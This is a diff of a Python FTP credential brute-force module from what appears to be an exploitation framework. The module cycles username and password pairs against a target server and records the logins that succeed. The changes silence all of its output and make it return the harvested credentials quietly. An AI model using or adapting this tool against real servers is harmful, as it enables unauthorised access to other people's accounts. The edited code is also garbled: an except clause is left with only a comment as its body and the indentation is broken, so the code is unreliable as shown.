@@ -28,14 +28,14 @@ class Exploit(exploits.Exploit):
     credentials = []
 
     def run(self):
-        print_status("Running module...")
+        #print_status("Running module...")
 
         self.credentials = []
         ftp = ftplib.FTP()
         try:
             ftp.connect(self.target, port=int(self.port), timeout=10)
         except socket.error, socket.timeout:
-            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
+         #   print_error("Connection error: %s:%s" % (self.target, str(self.port)))
             ftp.close()
             return
         except:
@@ -56,12 +56,11 @@ class Exploit(exploits.Exploit):
 
         self.run_threads(self.threads, self.target_function, collection)
 
-        if len(self.credentials):
-            print_success("Credentials found!")
-            headers = ("Login", "Password")
-            print_table(headers, *self.credentials)
-        else:
-            print_error("Credentials not found")
+    #    if len(self.credentials):
+            # print_success("Credentials found!")
+            # headers = ("Login", "Password")
+            # print_table(headers, *self.credentials)
+        return self.credentials
 
     def target_function(self, running, data):
         name = threading.current_thread().name
@@ -94,10 +93,10 @@ class Exploit(exploits.Exploit):
                     ftp.login(user, password)
 
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password)
+                   # print_success("{}: Authentication succeed!".format(name), user, password)
                     self.credentials.append((user, password))
                 except:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
+                   # print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
 
                 ftp.close() 
 
